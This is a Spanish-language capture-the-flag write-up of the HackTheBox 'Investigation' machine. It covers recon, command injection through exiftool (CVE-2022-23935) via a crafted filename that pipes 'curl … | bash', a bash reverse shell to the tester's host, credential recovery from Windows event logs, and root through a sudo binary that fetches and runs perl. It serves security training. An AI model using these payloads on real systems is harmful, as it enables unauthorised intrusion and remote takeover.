---
layout: single
title: HackTheBox - Investigation writeup
date: 2023-02-09
classes: wide
header:
  teaser: /assets/images/HackTheBox/Investigation/Investigation.png
  teaser_home_page: true
categories:
  - HackTheBox  
  - Medium
tags:
  - Exiftool
  - Microsoft Outlook
  - Event log
  - Sudo
  - Reversing
---

![](/assets/images/HackTheBox/Investigation/Investigation.png)

En la máquina de hoy abusaremos de una version desactualizada de `exiftool` que nos permitirá ejecutar comandos y ganar acceso. Encontraremos un archivo `.msg` (correo electrónico de Microsoft Outlook) dentro de la máquina que contendrá un archivo `.zip` con eventos de windows (.evtx), gracias a los eventos podremos encontrar credenciales expuestas para conectarnos por **ssh** (user pivoting). Para la escalada de privilegios podremos ejecutar un binario como **root** sin necesidad de contraseña, tendremos que hacer reversing al binario para entender qué es lo que esta haciendo y poder ganar una consola como root.

## Índice
* [Nmap, Fuzzing y Reconocimiento](#nmap-fuzzing-y-reconocimiento)
* [Exiftool RCE](#exiftool-rce)
* [User Pivoting](#user-pivoting)
* [Reversing and Privilege Escalation](#reversing-and-privilege-escalation)

## Nmap, Fuzzing y Reconocimiento

Como siempre, en la fase de reconocimiento usamos nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap/Puertos.txt 10.10.11.197
```

```
Puertos.txt

# Nmap 7.92 scan initiated Tue Jan 31 08:16:10 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap/Puertos.txt 10.10.11.197
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.197 ()   Status: Up
Host: 10.10.11.197 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
# Nmap done at Tue Jan 31 08:16:23 2023 -- 1 IP address (1 host up) scanned in 12.34 seconds
```

La máquina tiene 2 puertos abiertos, 22 y 80:

```bash
nmap -p22,80 -sVC -oN nmap/VersionServicios.txt 10.10.11.197
```

```
VersionServicios.txt

# Nmap 7.92 scan initiated Tue Jan 31 08:17:12 2023 as: nmap -p22,80 -sVC -oN nmap/VersionServicios.txt 10.10.11.197
Nmap scan report for eforenzics.htb (10.10.11.197)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: eForenzics - Premier Digital Forensics
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 31 08:17:21 2023 -- 1 IP address (1 host up) scanned in 9.67 seconds
```

Para enumerar un poco la página web por consola, antes de ir directamente al navegador, voy a utilizar `whatweb`.

![](/assets/images/HackTheBox/Investigation/whatweb.png)

La máquina está utilizando **Virtual Hosting**, para que nos resuelva tenemos que añadir una línea en el **/etc/hosts**

```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.197   eforenzics.htb
```

![](/assets/images/HackTheBox/Investigation/whatweb2.png)

## Exiftool RCE

La página principal nos dice que que podemos subir una foto gratis y que nos harán forense a la foto que subamos.

> http://eforenzics.htb/service.html

![](/assets/images/HackTheBox/Investigation/upload.png)

Cuando subimos una foto cualquiera podremos confirmar que está utilizando `exiftool` para hacer forense a la foto, pero esta versión de exiftool es vulnerable a inyección de comandos (versiones menores a la 12.38).<br>

![](/assets/images/HackTheBox/Investigation/exiftool.png)

La inyección se acontece cuando el nombre del archivo termina con un pipe `|`.<br>

* [CVE-2022-23935](https://nvd.nist.gov/vuln/detail/CVE-2022-23935)

Para ejecutar comandos he copiado una imagen real  y la he llamado <code>`curl 10.10.14.174|bash` |</code>. Estaré compartiendo un servidor http con python para mandarme la **reverse shell**.

```bash
cp /home/ch3chu/Descargas/wallpaper.png '`curl 10.10.14.174|bash` |'
```

![](/assets/images/HackTheBox/Investigation/file.png)

```bash
echo -e '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.174/443 0>&1"' > index.html
```

![](/assets/images/HackTheBox/Investigation/index.png)

Nos levantamos el servidor HTTP y a la vez nos ponemos a la escucha por el puerto **443**:

![](/assets/images/HackTheBox/Investigation/http.png)

Subimos la foto y recibimos la shell:

![](/assets/images/HackTheBox/Investigation/uploadPng.png)

![](/assets/images/HackTheBox/Investigation/www-data.png)

## User Pivoting

Al enumerar el sistema y buscar archivos de los usuarios existentes encontramos un archivo `.msg`.

![](/assets/images/HackTheBox/Investigation/find.png)

Los archivos con extensión **.msg** son archivos de correo electrónico en formato Microsoft Outlook. Representan mensajes de correo electrónico que se guardan localmente en el ordenador y se pueden abrir con Microsoft Outlook o cualquier otro programa que sea compatible con el formato **.msg**. Estos archivos contienen información sobre el remitente, el destinatario, el asunto, el cuerpo del mensaje, adjuntos y otras propiedades relacionadas con el correo electrónico. También pueden incluir información de seguimiento y elementos de calendario como citas y reuniones.<br>
Lo que hice en su momento fue transferirme este archivo a una máquina windows y darle doble click:

![](/assets/images/HackTheBox/Investigation/mensage.png)

Vemos que tiene un comprimido `zip` adjunto, si lo descomprimimos podemos ver que tiene un archivo con extensioin `evtx`, esta extensión se utiliza para los event log de windows. Lo más facil es transferirse este archivo a una máquina windows y darle doble click para poder inspeccionar los **logs** facilmente.<br>
En concreto hay un **ID de evento** *4776* que se registra cada vez que un controlador de dominio (DC) intenta validar las credenciales de una cuenta usando NTLM sobre Kerberos. Este evento también se registra para los intentos de inicio de sesión en la cuenta SAM local en estaciones de trabajo y servidores Windows, ya que NTLM es el mecanismo de autenticación predeterminado para el inicio de sesión local.

![](/assets/images/HackTheBox/Investigation/4776.png)

Vemos que hay credenciales expuestas, lo mas seguro es que sean del usuario `smorton`, lo cual me permite conectarme por **ssh**.

## Reversing and Privilege Escalation

Una vez estemos loggeados como `smorton` tenemos que volver a enumerar el sistema. Esta vez podemos ejecutar un binartio `/usr/bin/binary` como root sin necesidad de contraseña:

![](/assets/images/HackTheBox/Investigation/sudo.png)

Para saber un poco mejor que es lo que hace este ejecutable me creé un proyecto en `hydra` para poder leer el codigo en **C** y analizarlo. Básicamente este ejecutable primero valida si el número de argumentos que le estamos pasando es 3, si no, el programa sale; luego valida si el usuario que lo esta ejecutando es **root**, y por ultimo está comparando el ultimo argumento con una cadena de texto `lDnxUysaQn`, si no es la misma cadena se para el programa.

![](/assets/images/HackTheBox/Investigation/hydra.png)

Ahora que sabemos como ejecutar el programa correctamente, tenemos que entender que hace. Este trozo del codigo esta creando un archivo llamado como el último argumento que le pasemos, en este caso `lDnxUysaQn`, luego está realizando un curl al primero arugmento y lo esta guardando en el archivo creado.

![](/assets/images/HackTheBox/Investigation/hydra2.png)

Por último el programa está ejecutando el archivo `lDnxUysaQn` con perl.

![](/assets/images/HackTheBox/Investigation/hydra3.png)

Lo que me lleva a pensar es, ¿qué pasaría si pongo mi IP como primer argumento y me levanto un servidor HTTP con codigo en perl que me ejecute una bash?

![](/assets/images/HackTheBox/Investigation/index2.png)

![](/assets/images/HackTheBox/Investigation/index3.png)

![](/assets/images/HackTheBox/Investigation/root.png)
